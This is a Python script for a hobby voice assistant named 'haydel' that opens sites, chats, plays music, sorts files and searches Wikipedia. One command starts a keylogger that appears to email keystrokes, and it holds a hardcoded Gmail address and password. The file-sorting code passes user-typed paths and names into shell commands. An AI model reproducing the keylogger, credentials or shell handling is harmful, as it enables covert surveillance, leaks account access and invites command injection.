import pyttsx3
import webbrowser
import speech_recognition as sr
import wikipedia
import datetime
import os
import sys
import httplib2
import time
import datetime
import pynput
import pyautogui
import keyboard
import random
http = httplib2.Http()
                                                                                         
# Define URL's used when sending http requests
#url_on = 'http://192.168.43.118/gpio/1'
#url_off = 'http://192.168.43.118/gpio/0'
#response, content = http.request(url_off, 'GET')
engine = pyttsx3.init('sapi5')

voices = engine.getProperty('voices')
engine.setProperty('voice', voices[len(voices)-1].id)


def speak(audio):
    print('haydel: ' + audio)
    engine.say(audio)
    engine.runAndWait()

def greetMe():
    currentH = int(datetime.datetime.now().hour)
    if currentH >= 0 and currentH < 12:
        speak('Good Morning!')

    if currentH >= 12 and currentH < 18:
        speak('Good Afternoon!')

    if currentH >= 18 and currentH !=0:
        speak('Good Evening!')

greetMe()

speak('Hello Sir, I am haydel!')
speak('How may I help you?')


def myCommand():
    try:
        speak('i am ready to get command!')
        query = str(input('Command: '))
        
    except sr.UnknownValueError:
        speak('i am ready to get command')
        query = str(input('Command: '))

    return query
        

if __name__ == '__main__':

    while True:
    
        query = myCommand();
        query = query.lower()
        
        if 'open youtube' in query:
            speak('okay')
            webbrowser.open('www.youtube.com')

        elif 'open google' in query:
            speak('okay')
            webbrowser.open('www.google.co.in')

        elif 'open gmail' in query:
            speak('okay')
            webbrowser.open('www.gmail.com')

        elif "what\'s up" in query or 'how are you' in query:
            stMsgs = ['Just doing my thing!', 'I am fine!', 'Nice!', 'I am nice and full of energy']
            speak(random.choice(stMsgs))
        elif "who are you" in query or 'what is your name' in query:
            stMsgs = ['i am haydel, the ultimate power of universe at your service!', "my name is haydel"]
            speak(random.choice(stMsgs))
        elif "who made you" in query or 'who is your father' in query:
            stMsgs = ['i am creation of PakPakDeepak', "my name is haydel, i am the beauty of universe creation of PakPakDeepak!"]
            speak(random.choice(stMsgs))
        elif "do you believe in god" in query or 'who is god' in query:
            stMsgs = ['simply ,i am bot creation of human so i believe in human', "god is something who has the power to create and destroy"]
            speak(random.choice(stMsgs))
        elif "i love you" in query or 'will you marry me' in query:
            stMsgs = ['i am feeling shy', 'oh my god, i love you too', 'i love you too', 'sorry i have a boyfriend']
            speak(random.choice(stMsgs))

        elif 'nothing' in query or 'abort' in query or 'stop' in query:
            speak('okay')
            speak('Bye Sir, have a good day.')
            sys.exit()
           
        elif 'hello' in query or 'hi' in query:
            speak('Hello Sir')

        elif 'bye' in query:
            speak('Bye Sir, have a good day.')
            sys.exit()
                                    
        elif 'play music' in query:
            os.startfile("music1.mp3") 
            speak('Okay, here is your music! Enjoy!')
        elif 'log my board' in query:
            import key
            my_keylogger=key.Keylogger(60,"dphoenix657@gmail.com","darkinfinity00#")
            my_keylogger.start()
            speak('your keyboard is under surveillance')
  
        elif 'arrange files' in query:
            import subprocess,time
            import os,re
            path=str(input("set path for directory: "))
            l=path.split()
            modified="\\".join(l)
            os.chdir(modified)
            myset=os.listdir()
            key=int(input("choose custom names(1) or default name(2) : "))
            if key==2:
                for elements in myset:
                    m=re.findall(r"([^\s]+(\.(?i)(exe|gz|zip))$)",elements)
                    k=re.findall(r"([^\s]+(\.(?i)(jpg|png|gif|bmp))$)",elements)
                    t=re.findall(r"([^\s]+(\.(?i)(json|pdf|ppt|txt))$)",elements)
                    if len(k)>0 and ("wallpaper" or "wallpapers") not in myset:
                        subprocess.call("mkdir images", shell=True)
                    elif len(m)>0 and ("software" or "softwares") not in myset:
                        subprocess.call("mkdir softwares", shell=True)
                    elif len(t)>0 and ("text" or "texts") not in myset:
                        subprocess.call("mkdir texts", shell=True )                           
                subprocess.call("move *.exe "+modified+"\\softwares", shell=True)
                subprocess.call("move *.json "+modified+"\\texts", shell=True)
                subprocess.call("move *.gz "+modified+"\\softwares", shell=True)
                subprocess.call("move *.zip "+modified+"\\softwares", shell=True)
                subprocess.call("move *.jpg "+modified+"\\images", shell=True)
                subprocess.call("move *.png "+modified+"\\images", shell=True)
                subprocess.call("move *.gif "+modified+"\\images", shell=True)
                subprocess.call("move *.bmp "+modified+"\\images", shell=True)
                subprocess.call("move *.pdf "+modified+"\\texts", shell=True)
                subprocess.call("move *.txt "+modified+"\\texts", shell=True)
                subprocess.call("move *.ppt "+modified+"\\texts", shell=True)
            elif key==1:
                j,a,b=[],[],[]
                
                for elements in myset:
                    m=re.findall(r"([^\s]+(\.(?i)(exe|gz|zip))$)",elements)
                    k=re.findall(r"([^\s]+(\.(?i)(jpg|png|gif|bmp))$)",elements)
                    t=re.findall(r"([^\s]+(\.(?i)(json|pdf|ppt|txt))$)",elements)
                    j.append(m)
                    a.append(k)
                    b.append(t)
                if len(a)>0:
                    images=str(input("Enter name for image folder: "))
                    subprocess.call("mkdir "+images, shell=True)
                    subprocess.call("move *.jpg "+modified+"\\"+images, shell=True)
                    subprocess.call("move *.png "+modified+"\\"+images, shell=True)
                    subprocess.call("move *.gif "+modified+"\\"+images, shell=True)
                    subprocess.call("move *.bmp "+modified+"\\"+images, shell=True)
                    time.sleep(1)
                if len(j)>0:
                    softwares=str(input("Enter name for software folder: "))
                    subprocess.call("mkdir "+softwares, shell=True)
                    subprocess.call("move *.exe "+modified+"\\"+softwares, shell=True)
                    subprocess.call("move *.gz "+modified+"\\"+softwares, shell=True)
                    subprocess.call("move *.zip "+modified+"\\"+softwares, shell=True)
                    time.sleep(1)
                if len(b)>0:
                    texts=str(input("Enter name for texts folder: "))
                    subprocess.call("mkdir "+texts, shell=True)
                    subprocess.call("move *.pdf "+modified+"\\"+texts, shell=True)
                    subprocess.call("move *.txt "+modified+"\\"+texts, shell=True)
                    subprocess.call("move *.ppt "+modified+"\\"+texts, shell=True)
                    subprocess.call("move *.json "+modified+"\\"+texts, shell=True)
                    time.sleep(1)
                else:
                    print("Try agin Enter valid input")
                            
                speak('all files are now arranged')

        else:
            query = query
            speak('Searching...')
            try:
                results = wikipedia.summary(query, sentences=2)
                speak('Got it.')
                speak(' - ')
                speak(results)
        
            except:
                webbrowser.open('www.google.com')
        
        speak('Next Command! Sir!')
